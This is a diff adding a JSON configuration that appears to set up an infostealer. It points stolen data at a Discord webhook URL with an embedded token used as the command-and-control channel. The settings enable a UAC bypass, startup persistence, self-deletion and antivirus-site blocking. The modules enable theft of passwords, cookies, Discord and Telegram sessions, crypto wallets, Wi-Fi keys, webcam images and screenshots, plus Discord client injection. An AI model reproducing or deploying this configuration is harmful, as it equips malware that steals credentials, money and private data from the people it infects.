@@ -1,0 +1,44 @@
+{
+    "settings": {
+        "c2": [
+            0,
+            "https://discord.com/api/webhooks/1319266943928107009/xwf4Hu2m0NNAinDCuOq5HLVRSJZOLlYAAZGamW_T3vBnUgIbB8qSqgDPsMbHW54-nv7m"
+        ],
+        "mutex": "XlY6z5wIaVIvYqpp",
+        "pingme": false,
+        "vmprotect": true,
+        "startup": true,
+        "melt": true,
+        "uacBypass": true,
+        "archivePassword": "h3llc@tgU0nT0p",
+        "consoleMode": 0,
+        "debug": false,
+        "pumpedStubSize": 0,
+        "boundFileRunOnStartup": false
+    },
+    "modules": {
+        "captureWebcam": true,
+        "capturePasswords": true,
+        "captureCookies": true,
+        "captureHistory": true,
+        "captureAutofills": true,
+        "captureDiscordTokens": true,
+        "captureGames": true,
+        "captureWifiPasswords": true,
+        "captureSystemInfo": true,
+        "captureScreenshot": true,
+        "captureTelegramSession": true,
+        "captureCommonFiles": true,
+        "captureWallets": true,
+        "fakeError": [
+            false,
+            [
+                "",
+                "",
+                0
+            ]
+        ],
+        "blockAvSites": true,
+        "discordInjection": true
+    }
+}
